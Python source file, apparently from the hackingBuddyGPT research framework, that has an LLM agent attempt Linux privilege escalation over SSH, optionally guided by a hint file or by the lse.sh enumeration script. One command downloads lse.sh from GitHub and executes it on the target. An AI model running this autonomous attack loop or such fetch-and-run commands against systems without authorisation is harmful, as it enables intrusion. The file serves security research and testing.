import json
import pathlib
from mako.template import Template

from hackingBuddyGPT.capabilities import SSHRunCommand, SSHTestCredential
from hackingBuddyGPT.utils.openai.openai_llm import OpenAIConnection
from .common import Privesc
from hackingBuddyGPT.utils import SSHConnection
from hackingBuddyGPT.usecases.base import UseCase, use_case, AutonomousAgentUseCase, log_section

template_dir = pathlib.Path(__file__).parent / "templates"
template_lse = Template(filename=str(template_dir / "get_hint_from_lse.txt"))


class LinuxPrivesc(Privesc):
    conn: SSHConnection = None
    system: str = "linux"

    def init(self):
        super().init()
        self.add_capability(SSHRunCommand(conn=self.conn), default=True)
        self.add_capability(SSHTestCredential(conn=self.conn))


@use_case("Linux Privilege Escalation")
class LinuxPrivescUseCase(AutonomousAgentUseCase[LinuxPrivesc]):
    pass


@use_case("Linux Privilege Escalation using hints from a hint file initial guidance")
class LinuxPrivescWithHintFileUseCase(AutonomousAgentUseCase[LinuxPrivesc]):
    hints: str = None

    def init(self, configuration=None):
        super().init(configuration)
        self.agent.hint = self.read_hint()

    # simple helper that reads the hints file and returns the hint
    # for the current machine (test-case)
    def read_hint(self):
        try:
            with open(self.hints, "r") as hint_file:
                hints = json.load(hint_file)
                if self.agent.conn.hostname in hints:
                    return hints[self.agent.conn.hostname]
        except FileNotFoundError:
            self.log.console.print("[yellow]Hint file not found")
        except Exception as e:
            self.log.console.print("[yellow]Hint file could not be loaded:", str(e))
        return ""


@use_case("Linux Privilege Escalation using lse.sh for initial guidance")
class LinuxPrivescWithLSEUseCase(UseCase):
    conn: SSHConnection = None
    max_turns: int = 20
    enable_explanation: bool = False
    enable_update_state: bool = False
    disable_history: bool = False
    llm: OpenAIConnection = None

    # use either a use-case or an agent to perform the privesc
    use_use_case: bool = False
    _run_function = None
    _configuration: any = None

    def init(self, configuration=None):
        super().init(configuration)
        self._configuration = configuration

        if self._use_use_case:
            self._run_function = self.run_using_usecases
        else:
            self._run_function = self.run_using_agent

    # simple helper that uses lse.sh to get hints from the system
    @log_section("performing initial enumeration with lse.sh")
    def call_lse_against_host(self):
        run_cmd = "wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 | grep -v 'nope$' | grep -v 'skip$'"

        result, _ = SSHRunCommand(conn=self.conn, timeout=120)(run_cmd)

        self.log.status_message("[yellow]got LSE output:[/yellow]\n" + result)
        cmd = self.llm.get_response(template_lse, lse_output=result, number=3)
        self.log.call_response(cmd)

        return [x for x in cmd.result.splitlines() if x.strip()]

    def get_name(self) -> str:
        return self.__class__.__name__

    def run(self):
        # get the hints through running LSE on the target system
        hints = self.call_lse_against_host()
        turns_per_hint = int(self.max_turns / len(hints))

        # now try to escalate privileges using the hints
        for hint in hints:
            with self.log.section(f"Trying to escalate using hint: {hint}"):
                result = self._run_function(hint, turns_per_hint)
                if result is True:
                    self.log.run_was_success()
                    return True

    def run_using_usecases(self, hint, turns_per_hint):
        linux_privesc = LinuxPrivescUseCase(
            agent=LinuxPrivesc(
                conn=self.conn,
                enable_explanation=self.enable_explanation,
                enable_update_state=self.enable_update_state,
                disable_history=self.disable_history,
                llm=self.llm,
                hint=hint,
                log=self.log,
            ),
            max_turns=turns_per_hint,
            log=self.log,
        )
        linux_privesc.init(self._configuration)
        return linux_privesc.run()

    def run_using_agent(self, hint, turns_per_hint):
        agent = LinuxPrivesc(
            conn=self.conn,
            llm=self.llm,
            hint=hint,
            enable_explanation=self.enable_explanation,
            enable_update_state=self.enable_update_state,
            disable_history=self.disable_history,
            log=self.log,
        )
        agent.init()

        # perform the privilege escalation
        agent.before_run()
        turn = 1
        got_root = False
        while turn <= turns_per_hint and not got_root:
            self.log.console.log(f"[yellow]Starting turn {turn} of {turns_per_hint}")

            if agent.perform_round(turn) is True:
                got_root = True
            turn += 1

        # cleanup and finish
        agent.after_run()
        return got_root
